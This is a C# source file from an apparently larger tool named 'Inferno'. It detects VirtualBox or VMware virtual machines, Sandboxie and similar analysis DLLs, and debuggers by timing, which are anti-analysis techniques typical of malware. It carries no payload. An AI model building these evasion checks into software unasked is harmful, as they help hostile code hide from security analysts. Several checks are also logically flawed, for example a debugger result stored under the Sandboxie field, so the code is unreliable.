using System;
using System.Management;
using System.Runtime.InteropServices;
using System.Threading;

namespace Inferno
{
	internal class status
    {

		// Output
		private static dynamic output = new System.Dynamic.ExpandoObject();

		[DllImport("kernel32.dll")]
		protected static extern IntPtr GetModuleHandle(string lpModuleName);

		// VirtualBox
		private static bool VirtualBox()
		{
			using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
			{
				try
				{
					using (ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get())
					{
						foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
						{
							if ((managementBaseObject["Manufacturer"].ToString().ToLower() == "microsoft corporation" && managementBaseObject["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL")) || managementBaseObject["Manufacturer"].ToString().ToLower().Contains("vmware") || managementBaseObject["Model"].ToString() == "VirtualBox")
							{
								return true;
							}
						}
					}
				}
				catch
				{
					return true;
				}
			}
			foreach (ManagementBaseObject managementBaseObject2 in new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController").Get())
			{
				if (managementBaseObject2.GetPropertyValue("Name").ToString().Contains("VMware") && managementBaseObject2.GetPropertyValue("Name").ToString().Contains("VBox"))
				{
					return true;
				}
			}
			return false;
		}
		// In VirtualBox
		public static void inVirtualBox()
		{
			output.VirtualBox = VirtualBox();
			core.Exit("Is in VirtualBox", output);
		}

		// SandBoxie
		private static bool Sandboxie()
		{
			string[] array = new string[5]
			{
				"SbieDll.dll",
				"SxIn.dll",
				"Sf2.dll",
				"snxhk.dll",
				"cmdvrt32.dll"
			};
			for (int i = 0; i < array.Length; i++)
			{
				if (GetModuleHandle(array[i]).ToInt32() != 0)
				{
					return true;
				}
			}
			return false;
		}
		// In SandBoxie
		public static void inSandboxie()
		{
			output.SandBoxie = Sandboxie();
			core.Exit("Is in SandBoxie", output);
		}

		// Debugger
		private static bool Debugger()
		{
			try
			{
				long ticks = DateTime.Now.Ticks;
				Thread.Sleep(10);
				if (DateTime.Now.Ticks - ticks < 10L)
				{
					return true;
				}
			}
			catch { }
			return false;
		}

		// In Debugger
		public static void inDebugger()
		{
			output.SandBoxie = Debugger();
			core.Exit("Is in Debugger", output);
		}
	}
}
